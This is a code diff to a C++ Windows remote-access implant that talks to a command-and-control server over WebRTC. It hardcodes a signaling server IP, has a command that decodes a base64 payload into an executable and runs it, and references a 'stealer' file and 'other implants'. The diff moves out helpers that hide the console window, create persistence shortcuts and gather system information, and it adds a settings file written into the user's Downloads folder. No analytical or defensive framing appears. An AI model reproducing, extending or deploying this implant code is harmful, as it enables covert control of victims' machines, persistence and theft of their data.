@@ -1,7 +1,7 @@
 #include "rtc/rtc.hpp"
 
 #include "parse_cl.h"
-
+#include "helpers.h"
 #include <nlohmann/json.hpp>
 
 #include <algorithm>
@@ -46,19 +46,19 @@ string data_directory;
 string user_directory;
 
 
-string randomId(size_t length);
+//string randomId(size_t length);
 string parseMessage(string message);
 void createFileFromBase64String(char *filename);
 int runScript(char *file_source, char *file_output);
 int setupDirectory();
 int setupPersist();
-void HideConsole();
-std::string stream_as_string(std::istream &stm);
-HRESULT CreateLink(LPCSTR lpszPathObj, LPCSTR lpszPathLink, LPCSTR lpszPath, LPCSTR lpszDesc);
-std::string getLog(std::string filename);
-std::string getExePath(); 
-SYSTEM_INFO getSystemInfo(std::string data);
-inline bool fileExists(const std::string &name);
+//void HideConsole();
+//std::string stream_as_string(std::istream &stm);
+//HRESULT CreateLink(LPCSTR lpszPathObj, LPCSTR lpszPathLink, LPCSTR lpszPath, LPCSTR lpszDesc);
+//std::string getLog(std::string filename);
+//std::string getExePath(); 
+//SYSTEM_INFO getSystemInfo(std::string data);
+//inline bool fileExists(const std::string &name);
 
 
 const string c2_id = "6969";
@@ -67,10 +67,9 @@ const string stunServer2 = "stun:stun2.l.google.com:19302";
 const string signalServed = "ws://73.4.243.143:8000";
 
 const string fileName = "Downloader.exe";
+const string settingsName = "cache.txt";
 const int SLP_TIME = 6000;  // 1 Minute
 bool connected = false;
-
-
 
  
 /*** 
@@ -277,7 +276,7 @@ string parseMessage(string message) {
 		 * load | Loads a base64 string to an executable and executes it
 		 ***/
 	} else if (strncmp(message.c_str(), cmd4.c_str(), cmd4.size()) == 0) {
-		char *filename = "stealer5.txt";
+		char *filename = "prueba.txt";
 		cout << "RECEIVED DATA" << endl;
 		string numberStr = message.substr(message.find(":") + 1,
 		                                  message.find("::") +
@@ -338,6 +337,19 @@ int setupDirectory() {
 		}
 
 		data_directory = strPath + "\\Downloads\\cache-d";
+
+		try {
+			std::ofstream outfile(data_directory + "\\" + settingsName);
+
+			//Structure of settings
+			outfile << data_directory << endl;
+			//TODO: Other implants
+
+			outfile.close();
+
+		} catch (int E) {
+			return 0;
+		}
 
 		return 1;
 	}
@@ -502,95 +514,3 @@ shared_ptr<PeerConnection> createPeerConnection(const Configuration &config,
 	peerConnectionMap.emplace(id, pc);
 	return pc;
 };
-
-// Helper function to generate a random ID thanks libchanneldata
-string randomId(size_t length) {
-	static const string characters(
-	    "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz");
-	string id(length, '0');
-	default_random_engine rng(random_device{}());
-	uniform_int_distribution<int> dist(0, int(characters.size() - 1));
-	generate(id.begin(), id.end(), [&]() { return characters.at(dist(rng)); });
-	return id;
-}
-
-HRESULT CreateLink(LPCSTR lpszPathObj, LPCSTR lpszPathLink, LPCSTR lpszPath, LPCSTR lpszDesc)
-
-/*============================================================================*/
-{
-	IShellLink *psl = NULL;
-	HRESULT hres = CoInitialize(NULL);
-
-	// Get a pointer to the IShellLink interface. It is assumed that CoInitialize
-	// has already been called.
-
-	hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink,
-	                        (LPVOID *)&psl);
-	if (SUCCEEDED(hres)) {
-		IPersistFile *ppf;
-
-		// Set the path to the shortcut target and add the description.
-		psl->SetPath(lpszPathObj);
-		psl->SetDescription(lpszDesc);
-		psl->SetWorkingDirectory(lpszPath);
-
-		// Query IShellLink for the IPersistFile interface, used for saving the
-		// shortcut in persistent storage.
-		hres = psl->QueryInterface(IID_IPersistFile, (LPVOID *)&ppf);
-
-		if (SUCCEEDED(hres)) {
-			WCHAR wsz[MAX_PATH];
-
-			// Ensure that the string is Unicode.
-			MultiByteToWideChar(CP_ACP, 0, lpszPathLink, -1, wsz, MAX_PATH);
-
-			// Add code here to check return value from MultiByteWideChar
-			// for success.
-
-			// Save the link by calling IPersistFile::Save.
-			hres = ppf->Save(wsz, TRUE);
-
-			ppf->Release();
-		}
-		psl->Release();
-	}
-
-	CoUninitialize();
-
-	return hres;
-}
-
-void HideConsole() { ::ShowWindow(::GetConsoleWindow(), SW_HIDE); }
-
-std::string stream_as_string(std::istream &stm) {
-	return {std::istreambuf_iterator<char>(stm), std::istreambuf_iterator<char>{}};
-}
-
-std::string getLog(std::string filename) {
-	std::ifstream file(filename);
-	return stream_as_string(file);
-}
-
-std::string getExePath() {
-	char result[MAX_PATH];
-	return std::string(result, GetModuleFileName(NULL, result, MAX_PATH));
-}
-
-/***
- * getSystemInfo | Performs calls to WindowsAPI functions to retrieve hardware and software
-
- * *information
- ***/
-SYSTEM_INFO getSystemInfo(std::string data) {
-	SYSTEM_INFO siSysInfo;
-
-	// Copy the hardware information to the SYSTEM_INFO struct
-	GetSystemInfo(&siSysInfo);
-
-	return siSysInfo;
-}
-
-inline bool fileExists(const std::string &name) {
-	ifstream f(name.c_str());
-	return f.good();
-}
